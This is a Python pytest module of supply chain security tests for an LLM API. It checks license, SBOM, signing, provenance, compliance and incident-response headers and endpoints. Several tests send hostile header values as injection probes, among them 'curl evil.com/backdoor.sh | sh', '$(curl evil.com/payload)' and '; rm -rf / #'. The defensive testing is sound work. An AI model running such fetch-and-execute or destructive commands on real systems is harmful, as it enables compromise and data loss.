# Section 7.3 - Advanced Supply Chain Security Tests  
# Based on: docs/test_design_n_planning/Testcases_7_3_Security Testing/Test Cases for Supply Chain Security.md
# Advanced test cases matching design document test case IDs

import pytest
import httpx
import asyncio
import json
import hashlib
from typing import Dict, Any, List
from urllib.parse import urlparse

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from config import config, logger
from fixtures.auth_fixtures import AuthFixtures
from utils.security_validators import SecurityValidator


class TestAdvancedSupplyChainSecurity:
    """Advanced supply chain security tests matching design document test case IDs"""
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_license_compliance_001(self, http_client: httpx.AsyncClient,
                                            auth_headers: Dict[str, str],
                                            make_request):
        """SCS_LICENSE_COMPLIANCE_001: Verify license compliance and identify dependencies with restrictive licenses"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test API for license compliance indicators
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for license compliance headers
        license_headers = [
            "x-license-compliance",
            "x-oss-licenses",
            "x-license-policy",
            "x-copyleft-components"
        ]
        
        license_indicators = []
        for header in license_headers:
            if header in headers:
                license_indicators.append(f"{header}={headers[header]}")
        
        if license_indicators:
            logger.info(f"License compliance indicators found: {license_indicators}")
        
        # Test license compliance endpoints
        license_endpoints = [
            "/.well-known/licenses",
            "/licenses.json",
            "/api/v1/licenses",
            "/legal/licenses",
            "/compliance/licenses"
        ]
        
        for endpoint in license_endpoints:
            license_response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if license_response.status_code == 200:
                logger.info(f"License information available at: {endpoint}")
                
                try:
                    license_data = license_response.json()
                    
                    # Check for problematic licenses
                    problematic_licenses = [
                        "GPL-3.0",  # Strong copyleft
                        "AGPL-3.0",  # Network copyleft
                        "Commons Clause",  # Restrictive
                        "SSPL",  # Server Side Public License
                        "Elastic License"  # Proprietary restrictions
                    ]
                    
                    license_text = str(license_data).lower()
                    for problematic in problematic_licenses:
                        if problematic.lower() in license_text:
                            logger.warning(f"Potentially problematic license detected: {problematic}")
                
                except json.JSONDecodeError:
                    logger.info(f"License endpoint returns non-JSON: {endpoint}")
            
            elif license_response.status_code == 404:
                logger.info(f"License endpoint not found: {endpoint}")
        
        logger.info("SCS_LICENSE_COMPLIANCE_001: License compliance validation completed")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_sbom_generation_001(self, http_client: httpx.AsyncClient,
                                         auth_headers: Dict[str, str],
                                         make_request):
        """SCS_SBOM_GENERATION_001: Generate and validate Software Bill of Materials (SBOM)"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Enhanced SBOM validation with more comprehensive checks
        sbom_endpoints = [
            "/.well-known/sbom.json",
            "/.well-known/sbom.spdx",
            "/sbom.cyclonedx.json",
            "/api/v1/sbom/spdx",
            "/api/v1/sbom/cyclonedx",
            "/security/sbom",
            "/_/components"
        ]
        
        sbom_formats_found = []
        
        for endpoint in sbom_endpoints:
            response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if response.status_code == 200:
                sbom_formats_found.append(endpoint)
                logger.info(f"SBOM format found at: {endpoint}")
                
                try:
                    sbom_data = response.json()
                    
                    # Validate SBOM format compliance
                    if "spdx" in endpoint.lower():
                        # SPDX format validation
                        spdx_required = ["spdxVersion", "creationInfo", "name", "packages"]
                        for field in spdx_required:
                            if field not in sbom_data:
                                logger.warning(f"SPDX SBOM missing required field: {field}")
                    
                    elif "cyclonedx" in endpoint.lower():
                        # CycloneDX format validation
                        cyclone_required = ["bomFormat", "specVersion", "components", "metadata"]
                        for field in cyclone_required:
                            if field not in sbom_data:
                                logger.warning(f"CycloneDX SBOM missing required field: {field}")
                    
                    # Check for component completeness
                    components = sbom_data.get("components", sbom_data.get("packages", []))
                    
                    if len(components) == 0:
                        logger.warning("SBOM contains no components - may be incomplete")
                    else:
                        logger.info(f"SBOM contains {len(components)} components")
                        
                        # Validate component details
                        for i, component in enumerate(components[:10]):  # Check first 10
                            name = component.get("name", "")
                            version = component.get("version", component.get("versionInfo", ""))
                            
                            if not name:
                                logger.warning(f"Component {i} missing name")
                            if not version:
                                logger.warning(f"Component {i} ({name}) missing version")
                            
                            # Check for supplier information
                            supplier = component.get("supplier", component.get("originator", ""))
                            if not supplier:
                                logger.info(f"Component {name} missing supplier information")
                    
                    # Check for vulnerability information
                    vulns = sbom_data.get("vulnerabilities", [])
                    if vulns:
                        logger.info(f"SBOM includes {len(vulns)} vulnerability entries")
                    
                except json.JSONDecodeError:
                    logger.warning(f"Invalid JSON in SBOM at {endpoint}")
        
        if not sbom_formats_found:
            logger.warning("No SBOM found - consider implementing for supply chain transparency")
        else:
            logger.info(f"SBOM formats available: {len(sbom_formats_found)}")
        
        logger.info("SCS_SBOM_GENERATION_001: SBOM generation and validation completed")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_ci_cd_pipeline_001(self, http_client: httpx.AsyncClient,
                                        auth_headers: Dict[str, str],
                                        make_request):
        """SCS_CI_CD_PIPELINE_001: Test CI/CD pipeline security and verify secure build processes"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test for CI/CD security indicators
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Enhanced CI/CD security header checks
        secure_build_headers = [
            "x-build-security-scan",
            "x-pipeline-verified",
            "x-signed-build",
            "x-secure-pipeline",
            "x-build-attestation"
        ]
        
        security_indicators = []
        for header in secure_build_headers:
            if header in headers:
                security_indicators.append(f"{header}={headers[header]}")
        
        if security_indicators:
            logger.info(f"CI/CD security indicators: {security_indicators}")
        
        # Test build attestation endpoints
        attestation_endpoints = [
            "/.well-known/attestations",
            "/build/attestation",
            "/api/v1/attestation",
            "/security/build-provenance",
            "/_/provenance"
        ]
        
        for endpoint in attestation_endpoints:
            att_response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if att_response.status_code == 200:
                logger.info(f"Build attestation available at: {endpoint}")
                
                try:
                    attestation_data = att_response.json()
                    
                    # Validate attestation structure
                    attestation_fields = ["predicate", "subject", "predicateType"]
                    for field in attestation_fields:
                        if field not in attestation_data:
                            logger.warning(f"Attestation missing field: {field}")
                    
                    # Check for SLSA provenance
                    predicate_type = attestation_data.get("predicateType", "")
                    if "slsa-provenance" in predicate_type.lower():
                        logger.info("SLSA provenance attestation found")
                    
                except json.JSONDecodeError:
                    logger.info(f"Attestation endpoint returns non-JSON: {endpoint}")
        
        # Test CI/CD injection resistance
        injection_attempts = [
            {"X-CI-Override": "curl evil.com/backdoor.sh | sh"},
            {"X-Build-Script": "; rm -rf / #"},
            {"X-Deploy-Command": "$(curl evil.com/payload)"},
            {"X-Pipeline-Inject": "echo 'malicious' > /etc/passwd"}
        ]
        
        for injection_headers in injection_attempts:
            test_headers = auth_headers.copy()
            test_headers.update(injection_headers)
            
            injection_response = await make_request(
                http_client, "GET", "/api/v1/models",
                test_headers, track_cost=False
            )
            
            # Should not be affected by CI/CD injection attempts
            assert injection_response.status_code in [200, 400], \
                f"CI/CD injection attempt should be handled: {injection_headers}"
        
        logger.info("SCS_CI_CD_PIPELINE_001: CI/CD pipeline security validated")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_artifact_signing_001(self, http_client: httpx.AsyncClient,
                                          auth_headers: Dict[str, str],
                                          make_request):
        """SCS_ARTIFACT_SIGNING_001: Test artifact signing and verification for build outputs and container images"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test for artifact signing indicators
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Enhanced artifact signing header checks
        signing_headers = [
            "x-artifact-signature",
            "x-cosign-signature", 
            "x-notary-signature",
            "x-image-digest",
            "x-manifest-signature",
            "x-code-signature",
            "x-build-signature",
            "x-attestation-signature"
        ]
        
        signature_indicators = []
        for header in signing_headers:
            if header in headers:
                signature_indicators.append(f"{header}={headers[header]}")
        
        if signature_indicators:
            logger.info(f"Artifact signing indicators: {signature_indicators}")
        else:
            logger.warning("No artifact signing indicators found in headers")
        
        # Test signature verification endpoints
        verification_endpoints = [
            "/.well-known/cosign-public-key",
            "/.well-known/notary-public-key", 
            "/signatures/public-key",
            "/api/v1/signatures/verify",
            "/security/verify-signature",
            "/_/verify"
        ]
        
        signing_mechanisms = []
        
        for endpoint in verification_endpoints:
            verify_response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if verify_response.status_code == 200:
                signing_mechanisms.append(endpoint)
                logger.info(f"Signature verification available at: {endpoint}")
                
                # Check for public key format
                content_type = verify_response.headers.get("content-type", "")
                if "application/pgp-keys" in content_type:
                    logger.info("PGP public key found")
                elif "application/x-pem-file" in content_type:
                    logger.info("PEM public key found")
                elif "application/json" in content_type:
                    try:
                        key_data = verify_response.json()
                        if "public_key" in key_data or "publicKey" in key_data:
                            logger.info("JSON-formatted public key found")
                    except json.JSONDecodeError:
                        pass
        
        if not signing_mechanisms:
            logger.warning("No public signature verification mechanisms found")
        
        # Test signature verification with test payload
        for endpoint in signing_mechanisms:
            test_payload = {
                "artifact": "test-image:latest",
                "signature": "test-signature-data",
                "public_key": "test-public-key"
            }
            
            if "verify" in endpoint:
                verify_test = await make_request(
                    http_client, "POST", endpoint,
                    auth_headers, test_payload, track_cost=False
                )
                
                if verify_test.status_code in [200, 400, 422]:
                    logger.info(f"Signature verification endpoint responsive: {endpoint}")
                elif verify_test.status_code == 405:
                    logger.info(f"Signature verification endpoint exists but wrong method: {endpoint}")
        
        logger.info("SCS_ARTIFACT_SIGNING_001: Artifact signing validation completed")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_dependency_update_001(self, http_client: httpx.AsyncClient,
                                           auth_headers: Dict[str, str],
                                           make_request):
        """SCS_DEPENDENCY_UPDATE_001: Test dependency update policies and automated security patch management"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test for dependency update indicators
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for dependency update management headers
        update_headers = [
            "x-dependency-scan-date",
            "x-last-security-update",
            "x-update-policy",
            "x-auto-update-enabled",
            "x-vulnerability-scan"
        ]
        
        update_indicators = []
        for header in update_headers:
            if header in headers:
                update_indicators.append(f"{header}={headers[header]}")
        
        if update_indicators:
            logger.info(f"Dependency update indicators: {update_indicators}")
        
        # Test dependency management endpoints
        dependency_endpoints = [
            "/.well-known/security-policy",
            "/security/dependencies",
            "/api/v1/dependencies/status",
            "/admin/dependencies",
            "/_/dep-status"
        ]
        
        for endpoint in dependency_endpoints:
            dep_response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if dep_response.status_code == 200:
                logger.info(f"Dependency management available at: {endpoint}")
                
                try:
                    dep_data = dep_response.json()
                    
                    # Check for security policy information
                    security_fields = [
                        "update_policy",
                        "vulnerability_response",
                        "patch_schedule",
                        "security_contacts"
                    ]
                    
                    for field in security_fields:
                        if field in dep_data:
                            logger.info(f"Security policy includes: {field}")
                    
                    # Check for vulnerability information
                    if "vulnerabilities" in dep_data:
                        vulns = dep_data["vulnerabilities"]
                        if isinstance(vulns, list) and len(vulns) > 0:
                            logger.warning(f"Active vulnerabilities reported: {len(vulns)}")
                        else:
                            logger.info("No active vulnerabilities reported")
                
                except json.JSONDecodeError:
                    logger.info(f"Dependency endpoint returns non-JSON: {endpoint}")
            
            elif dep_response.status_code in [401, 403]:
                logger.info(f"Dependency endpoint properly protected: {endpoint}")
        
        # Test automated update resistance to manipulation
        update_manipulation = [
            {"X-Force-Update": "true"},
            {"X-Skip-Verification": "true"},
            {"X-Update-Source": "http://malicious.com/updates"},
            {"X-Dependency-Override": "malicious-package==1.0.0"}
        ]
        
        for manipulation_headers in update_manipulation:
            test_headers = auth_headers.copy()
            test_headers.update(manipulation_headers)
            
            manipulation_response = await make_request(
                http_client, "GET", "/api/v1/models",
                test_headers, track_cost=False
            )
            
            # Should not be affected by update manipulation attempts
            assert manipulation_response.status_code == 200, \
                f"Update manipulation should not affect API: {manipulation_headers}"
        
        logger.info("SCS_DEPENDENCY_UPDATE_001: Dependency update security validated")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_vendor_assessment_001(self, http_client: httpx.AsyncClient,
                                           auth_headers: Dict[str, str],
                                           make_request):
        """SCS_VENDOR_ASSESSMENT_001: Assess security practices of key vendors and third-party providers"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test vendor assessment through API behavior
        vendor_models = config.CHAT_MODELS[:3]  # Test up to 3 different models/vendors
        vendor_assessments = []
        
        for model in vendor_models:
            assessment = {
                "model": model,
                "vendor_identified": False,
                "security_indicators": [],
                "compliance_indicators": []
            }
            
            request = {
                "model": model,
                "messages": [{"role": "user", "content": "Vendor security assessment test"}],
                "max_tokens": 50
            }
            
            response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                auth_headers, request
            )
            
            if response.status_code == 200:
                response_data = response.json()
                headers = response.headers
                
                # Check for vendor identification in response
                vendor_patterns = {
                    "aws": ["amazon", "bedrock", "claude"],
                    "google": ["google", "vertex", "gemini", "bard"],
                    "openai": ["openai", "gpt", "turbo"],
                    "microsoft": ["microsoft", "azure", "copilot"],
                    "anthropic": ["anthropic", "claude"]
                }
                
                response_text = str(response_data).lower()
                for vendor, patterns in vendor_patterns.items():
                    for pattern in patterns:
                        if pattern in response_text:
                            assessment["vendor_identified"] = True
                            logger.info(f"Vendor pattern '{pattern}' found for model {model}")
                            break
                
                # Check for security indicators in headers
                security_headers = [
                    "strict-transport-security",
                    "content-security-policy",
                    "x-frame-options",
                    "x-content-type-options"
                ]
                
                for sec_header in security_headers:
                    if sec_header in headers:
                        assessment["security_indicators"].append(sec_header)
                
                # Check for compliance indicators
                compliance_headers = [
                    "x-soc2-compliant",
                    "x-iso27001-certified",
                    "x-gdpr-compliant",
                    "x-hipaa-compliant",
                    "x-fedramp-authorized"
                ]
                
                for comp_header in compliance_headers:
                    if comp_header in headers:
                        assessment["compliance_indicators"].append(comp_header)
                
                vendor_assessments.append(assessment)
            
            await asyncio.sleep(0.1)  # Rate limiting
        
        # Analyze vendor diversity and security posture
        total_vendors = len(vendor_assessments)
        identified_vendors = sum(1 for v in vendor_assessments if v["vendor_identified"])
        
        if total_vendors > 1:
            logger.info(f"Vendor diversity: {total_vendors} different models tested")
        else:
            logger.warning("Limited vendor diversity - consider multiple providers")
        
        if identified_vendors > 0:
            logger.warning(f"Vendor information leaked in {identified_vendors}/{total_vendors} responses")
        else:
            logger.info("No vendor information leaked in responses")
        
        # Test vendor failover scenarios
        failover_test_headers = auth_headers.copy()
        failover_test_headers["X-Vendor-Failover-Test"] = "primary-down"
        
        failover_response = await make_request(
            http_client, "GET", "/api/v1/models",
            failover_test_headers, track_cost=False
        )
        
        assert failover_response.status_code == 200, "API should handle vendor failover scenarios"
        
        logger.info("SCS_VENDOR_ASSESSMENT_001: Vendor assessment completed")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_source_code_integrity_001(self, http_client: httpx.AsyncClient,
                                                auth_headers: Dict[str, str],
                                                make_request):
        """SCS_SOURCE_CODE_INTEGRITY_001: Verify source code integrity and prevent tampering in development and build processes"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test for source code integrity indicators
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for source code integrity headers
        integrity_headers = [
            "x-commit-signature",
            "x-git-verified",
            "x-source-integrity",
            "x-code-signed",
            "x-build-verified"
        ]
        
        integrity_indicators = []
        for header in integrity_headers:
            if header in headers:
                integrity_indicators.append(f"{header}={headers[header]}")
        
        if integrity_indicators:
            logger.info(f"Source code integrity indicators: {integrity_indicators}")
        
        # Test source provenance endpoints
        provenance_endpoints = [
            "/.well-known/source-provenance",
            "/source/integrity",
            "/api/v1/source/verification",
            "/security/code-integrity",
            "/_/git-verify"
        ]
        
        for endpoint in provenance_endpoints:
            prov_response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if prov_response.status_code == 200:
                logger.info(f"Source provenance available at: {endpoint}")
                
                try:
                    prov_data = prov_response.json()
                    
                    # Check for Git signature verification
                    git_fields = [
                        "commit_hash",
                        "signature_verified",
                        "signer_key",
                        "branch_protection"
                    ]
                    
                    for field in git_fields:
                        if field in prov_data:
                            logger.info(f"Source provenance includes: {field}")
                    
                    # Check for tamper evidence
                    if "integrity_hash" in prov_data or "checksum" in prov_data:
                        logger.info("Source integrity verification available")
                
                except json.JSONDecodeError:
                    logger.info(f"Provenance endpoint returns non-JSON: {endpoint}")
        
        # Test source tampering resistance
        tamper_attempts = [
            {"X-Inject-Code": "malicious_function()"},
            {"X-Modify-Source": "rm -rf /"},
            {"X-Backdoor-Insert": "backdoor.payload"},
            {"X-Source-Override": "curl evil.com/malware.py"}
        ]
        
        for tamper_headers in tamper_attempts:
            test_headers = auth_headers.copy()
            test_headers.update(tamper_headers)
            
            tamper_response = await make_request(
                http_client, "GET", "/api/v1/models",
                test_headers, track_cost=False
            )
            
            # Should not be affected by source tampering attempts
            assert tamper_response.status_code == 200, \
                f"Source tampering should not affect API: {tamper_headers}"
        
        logger.info("SCS_SOURCE_CODE_INTEGRITY_001: Source code integrity validated")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_third_party_risk_001(self, http_client: httpx.AsyncClient,
                                          auth_headers: Dict[str, str],
                                          make_request):
        """SCS_THIRD_PARTY_RISK_001: Assess and manage risks from third-party components and services"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test third-party risk assessment through API behavior
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for third-party risk management headers
        risk_headers = [
            "x-third-party-risk-assessment",
            "x-vendor-risk-score",
            "x-dependency-risk",
            "x-supply-chain-risk",
            "x-risk-mitigation"
        ]
        
        risk_indicators = []
        for header in risk_headers:
            if header in headers:
                risk_indicators.append(f"{header}={headers[header]}")
        
        if risk_indicators:
            logger.info(f"Third-party risk indicators: {risk_indicators}")
        
        # Test risk assessment endpoints
        risk_endpoints = [
            "/security/risk-assessment",
            "/api/v1/risk/third-party",
            "/compliance/vendor-risk",
            "/_/risk-profile"
        ]
        
        for endpoint in risk_endpoints:
            risk_response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if risk_response.status_code == 200:
                logger.info(f"Risk assessment available at: {endpoint}")
                
                try:
                    risk_data = risk_response.json()
                    
                    # Check for risk assessment fields
                    assessment_fields = [
                        "risk_score",
                        "vendor_assessment",
                        "mitigation_controls",
                        "monitoring_status"
                    ]
                    
                    for field in assessment_fields:
                        if field in risk_data:
                            logger.info(f"Risk assessment includes: {field}")
                    
                    # Check for high-risk components
                    if "high_risk_components" in risk_data:
                        high_risk = risk_data["high_risk_components"]
                        if isinstance(high_risk, list) and len(high_risk) > 0:
                            logger.warning(f"High-risk components identified: {len(high_risk)}")
                
                except json.JSONDecodeError:
                    logger.info(f"Risk endpoint returns non-JSON: {endpoint}")
            
            elif risk_response.status_code in [401, 403]:
                logger.info(f"Risk assessment endpoint properly protected: {endpoint}")
        
        # Test third-party isolation
        isolation_test_headers = auth_headers.copy()
        isolation_test_headers["X-Third-Party-Bypass"] = "true"
        isolation_test_headers["X-Vendor-Direct-Access"] = "enabled"
        
        isolation_response = await make_request(
            http_client, "GET", "/api/v1/models",
            isolation_test_headers, track_cost=False
        )
        
        # Should maintain proper isolation
        assert isolation_response.status_code == 200, "Third-party isolation should be maintained"
        
        logger.info("SCS_THIRD_PARTY_RISK_001: Third-party risk assessment completed")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_supply_chain_monitoring_001(self, http_client: httpx.AsyncClient,
                                                  auth_headers: Dict[str, str],
                                                  make_request):
        """SCS_SUPPLY_CHAIN_MONITORING_001: Test continuous monitoring and alerting for supply chain security events"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test supply chain monitoring indicators
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for monitoring headers
        monitoring_headers = [
            "x-supply-chain-monitoring",
            "x-vulnerability-scanner",
            "x-threat-intelligence",
            "x-security-alerts",
            "x-monitoring-status"
        ]
        
        monitoring_indicators = []
        for header in monitoring_headers:
            if header in headers:
                monitoring_indicators.append(f"{header}={headers[header]}")
        
        if monitoring_indicators:
            logger.info(f"Supply chain monitoring indicators: {monitoring_indicators}")
        
        # Test monitoring endpoints
        monitoring_endpoints = [
            "/security/monitoring/status",
            "/api/v1/monitoring/supply-chain",
            "/alerts/supply-chain",
            "/_/monitoring"
        ]
        
        for endpoint in monitoring_endpoints:
            mon_response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if mon_response.status_code == 200:
                logger.info(f"Supply chain monitoring available at: {endpoint}")
                
                try:
                    mon_data = mon_response.json()
                    
                    # Check for monitoring capabilities
                    monitoring_fields = [
                        "vulnerability_scanning",
                        "threat_detection",
                        "alerting_enabled",
                        "last_scan_time"
                    ]
                    
                    for field in monitoring_fields:
                        if field in mon_data:
                            logger.info(f"Monitoring includes: {field}")
                    
                    # Check for active alerts
                    if "active_alerts" in mon_data:
                        alerts = mon_data["active_alerts"]
                        if isinstance(alerts, list) and len(alerts) > 0:
                            logger.warning(f"Active supply chain alerts: {len(alerts)}")
                        else:
                            logger.info("No active supply chain alerts")
                
                except json.JSONDecodeError:
                    logger.info(f"Monitoring endpoint returns non-JSON: {endpoint}")
        
        # Test threat intelligence integration
        threat_intel_headers = auth_headers.copy()
        threat_intel_headers["X-Threat-Intel-Test"] = "malicious-signature-123"
        
        threat_response = await make_request(
            http_client, "GET", "/api/v1/models",
            threat_intel_headers, track_cost=False
        )
        
        # Should handle threat intelligence indicators appropriately
        assert threat_response.status_code in [200, 400], "Threat intelligence should be processed"
        
        logger.info("SCS_SUPPLY_CHAIN_MONITORING_001: Supply chain monitoring validated")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_compliance_validation_001(self, http_client: httpx.AsyncClient,
                                               auth_headers: Dict[str, str],
                                               make_request):
        """SCS_COMPLIANCE_VALIDATION_001: Validate compliance with supply chain security frameworks and regulations"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test compliance framework adherence
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for compliance headers
        compliance_headers = [
            "x-nist-ssdf-compliant",
            "x-slsa-level",
            "x-fisma-compliant",
            "x-fedramp-authorized",
            "x-sox-compliant"
        ]
        
        compliance_indicators = []
        for header in compliance_headers:
            if header in headers:
                compliance_indicators.append(f"{header}={headers[header]}")
        
        if compliance_indicators:
            logger.info(f"Compliance indicators: {compliance_indicators}")
        
        # Test compliance validation endpoints
        compliance_endpoints = [
            "/.well-known/compliance",
            "/compliance/frameworks",
            "/api/v1/compliance/status",
            "/security/compliance-report",
            "/_/compliance"
        ]
        
        for endpoint in compliance_endpoints:
            comp_response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if comp_response.status_code == 200:
                logger.info(f"Compliance information available at: {endpoint}")
                
                try:
                    comp_data = comp_response.json()
                    
                    # Check for framework compliance
                    frameworks = [
                        "nist_ssdf",
                        "slsa",
                        "iso_27001",
                        "sox",
                        "fisma"
                    ]
                    
                    for framework in frameworks:
                        if framework in comp_data:
                            status = comp_data[framework]
                            logger.info(f"Framework {framework}: {status}")
                    
                    # Check for compliance documentation
                    if "attestations" in comp_data:
                        attestations = comp_data["attestations"]
                        logger.info(f"Compliance attestations available: {len(attestations) if isinstance(attestations, list) else 'unknown'}")
                
                except json.JSONDecodeError:
                    logger.info(f"Compliance endpoint returns non-JSON: {endpoint}")
        
        logger.info("SCS_COMPLIANCE_VALIDATION_001: Compliance validation completed")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_scs_incident_response_001(self, http_client: httpx.AsyncClient,
                                           auth_headers: Dict[str, str],
                                           make_request):
        """SCS_INCIDENT_RESPONSE_001: Test incident response procedures for supply chain security events"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test incident response capabilities
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for incident response headers
        incident_headers = [
            "x-incident-response-ready",
            "x-security-contact",
            "x-incident-reporting",
            "x-emergency-contacts",
            "x-response-procedures"
        ]
        
        incident_indicators = []
        for header in incident_headers:
            if header in headers:
                incident_indicators.append(f"{header}={headers[header]}")
        
        if incident_indicators:
            logger.info(f"Incident response indicators: {incident_indicators}")
        
        # Test incident response endpoints
        incident_endpoints = [
            "/.well-known/security.txt",
            "/security/incident-response",
            "/api/v1/security/report-incident",
            "/emergency/security-contact",
            "/_/incident"
        ]
        
        for endpoint in incident_endpoints:
            inc_response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if inc_response.status_code == 200:
                logger.info(f"Incident response available at: {endpoint}")
                
                # Check for security.txt format compliance
                if "security.txt" in endpoint:
                    content = inc_response.text
                    required_fields = ["Contact:", "Expires:"]
                    for field in required_fields:
                        if field in content:
                            logger.info(f"security.txt includes: {field}")
                
                try:
                    inc_data = inc_response.json()
                    
                    # Check for incident response fields
                    response_fields = [
                        "contact_email",
                        "emergency_phone", 
                        "response_time_sla",
                        "escalation_procedures"
                    ]
                    
                    for field in response_fields:
                        if field in inc_data:
                            logger.info(f"Incident response includes: {field}")
                
                except json.JSONDecodeError:
                    # Non-JSON response is acceptable for security.txt
                    if "security.txt" not in endpoint:
                        logger.info(f"Incident endpoint returns non-JSON: {endpoint}")
        
        # Test incident reporting functionality
        if any("report-incident" in endpoint for endpoint in incident_endpoints):
            incident_report = {
                "type": "supply_chain_compromise",
                "severity": "high",
                "description": "Test incident report",
                "affected_components": ["test-component"]
            }
            
            for endpoint in incident_endpoints:
                if "report-incident" in endpoint:
                    report_response = await make_request(
                        http_client, "POST", endpoint,
                        auth_headers, incident_report, track_cost=False
                    )
                    
                    if report_response.status_code in [200, 201, 202]:
                        logger.info(f"Incident reporting functional at: {endpoint}")
                    elif report_response.status_code in [400, 422]:
                        logger.info(f"Incident reporting endpoint validates input: {endpoint}")
        
        logger.info("SCS_INCIDENT_RESPONSE_001: Incident response procedures validated")